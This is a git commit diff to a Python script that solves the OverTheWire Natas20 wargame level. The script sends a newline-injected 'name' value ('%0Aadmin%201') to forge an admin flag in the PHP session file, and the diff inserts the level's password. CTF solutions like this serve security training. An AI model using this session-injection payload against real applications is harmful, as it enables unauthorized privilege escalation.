1e3cae79674a176dd815e856131f4a04e89c4ba8
B4ld3zhn1k <nishietachopapechomame1@proton.me>
2026-06-20 18:22:40 +0600

    Update Natas20.py

--- Natas20/Natas20.py
+++ Natas20/Natas20.py
@@ -2,25 +2,23 @@ import requests
 import re
 
 url = "http://natas20.natas.labs.overthewire.org/"
-auth  = ("natas20", "secret")
+auth  = ("natas20", "p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw")
 
 def exploit():
     session = requests.Session()
     session.auth = auth
 
     print("[*]Creating first session")
-    payload = {
-        "name": "Mike\nadmin 1"
-    }
+    target_url = f"{url}?debug&name=Yasha%0Aadmin%201" # %0A - that a encoded in URL "/n" - newline. %20 - That a encoded in URL "space"
 
-    response_post = session.post(f"{url}?debug", data=payload)
+    response_post = session.post(target_url, timeout = 10)
 
     if response_post.status_code != 200:
         print(f"[-]Error to connect the server: {response_post.status_code}") # this line tell us about Error between us PC and Server of Natas
         return
     print("[+]Injection has sended to server, file of session was modified")
 
-    response_get = session.get(f"{url}?debug")
+    response_get = session.get(f"{url}?debug", timeout=10)
 
     if "you are an admin" in response_get.text.lower(): # This line checking unique text in response text
         print("[+]Congratulations! Access done.")
